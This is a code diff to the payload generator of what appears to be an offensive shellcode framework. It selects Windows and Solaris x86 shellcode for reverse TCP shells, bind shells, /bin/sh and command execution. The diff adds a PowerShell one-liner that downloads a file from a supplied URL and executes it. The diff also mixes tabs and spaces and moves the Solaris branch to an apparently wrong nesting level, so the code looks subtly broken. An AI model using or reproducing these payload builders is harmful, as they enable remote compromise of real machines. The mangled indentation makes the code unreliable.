@@ -243,46 +243,50 @@ def generator( choose, shellcode, argv="None", argv2="None"):
 
 	elif choose == "windows":
 		if shellcode == "messagebox":
-			from Windows import messagebox
+                        from Windows import messagebox
 			from stackconvert import stackconvertSTR
 			if argv == "None":
 				return messagebox.messagebox( False)
 			else:
 				return messagebox.messagebox( stackconvertSTR(argv, True))
 
-		elif shellcode == "downloandandexecute":
-			from Windows import downloadandexecute
-			from stackconvert import rawSTR
-			from stackconvert import stackconvertSTR
-			return downloadandexecute.downANDexecute( rawSTR(argv), stackconvertSTR(argv2, True))
+                elif shellcode == "downloadandexecute":
+                        from Windows.downloadandexecute import downANDexecute
+                        from stackconvert import rawSTR
+                        from stackconvert import stackconvertSTR
+                        if argv2 == "None":
+                                argv2 = argv.split("/")[-1]
+                        powershell = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s') ;(New-Object -com Shell.Application).ShellExecute('%s');}"''' % (argv, argv2, argv2)
+                        return downANDexecute(payload=stackconvertSTR(powershell))
+
 			
-		elif shellcode == "exec":
-			from Windows.execc import WinExec
-			return WinExec(argv)
+                elif shellcode == "exec":
+                        from Windows.execc import WinExec
+                        return WinExec(argv)
 
-		elif shellcode == "tcp_bind":
-			from Windows.bind_tcp import PayloadModule
-			return PayloadModule( argv).gen_shellcode()
+                elif shellcode == "tcp_bind":
+                        from Windows.bind_tcp import PayloadModule
+                        return PayloadModule( argv).gen_shellcode()
 
-		elif shellcode	== "reverse_tcp":
-			from Windows.rev_tcp import PayloadModule
-			return PayloadModule( argv, argv2).gen_shellcode()
+                elif shellcode	== "reverse_tcp":
+                        from Windows.rev_tcp import PayloadModule
+                        return PayloadModule( argv, argv2).gen_shellcode()
 
 
-	elif choose == "solarisx86":	
-		if shellcode == "read":
-			from Solarisx86.read import read
-			from plaintext import plaintext
-			return read( plaintext(argv))	
-		elif shellcode == "reverse_tcp":
-			from Solarisx86.reverse_tcp import reverse_tcp
-			from stackconvert import IP
-			from stackconvert import PORT
-			return reverse_tcp( IP(argv2), PORT(argv))
-		elif shellcode == "bin_sh":
-			from Solarisx86.bin_sh import bin_sh
-			return bin_sh()
-		elif shellcode == "tcp_bind":
-			from Solarisx86.tcp_bind import tcp_bind
-			from stackconvert import PORT
-			return tcp_bind( PORT(argv))
+                elif choose == "solarisx86":	
+                        if shellcode == "read":
+                                from Solarisx86.read import read
+                                from plaintext import plaintext
+                                return read( plaintext(argv))	
+                        elif shellcode == "reverse_tcp":
+                                from Solarisx86.reverse_tcp import reverse_tcp
+                                from stackconvert import IP
+                                from stackconvert import PORT
+                                return reverse_tcp( IP(argv2), PORT(argv))
+                        elif shellcode == "bin_sh":
+                                from Solarisx86.bin_sh import bin_sh
+                                return bin_sh()
+                        elif shellcode == "tcp_bind":
+                                from Solarisx86.tcp_bind import tcp_bind
+                                from stackconvert import PORT
+                                return tcp_bind( PORT(argv))
